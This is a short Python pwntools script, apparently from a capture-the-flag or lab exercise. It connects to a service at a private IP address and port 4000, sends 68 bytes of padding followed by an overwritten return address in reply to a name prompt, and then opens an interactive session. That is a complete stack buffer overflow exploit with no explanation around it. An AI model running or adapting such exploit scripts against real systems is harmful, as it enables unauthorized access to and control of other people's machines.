import pwn

def exploit():
    conn = pwn.remote("172.19.2.137",4000)
    while conn.can_recv(timeout=1):
        conn.sendlineafter("Hello, what's your name?\n","A"*68+"\x2c\x05\x01\x00")
        conn.interactive()

exploit()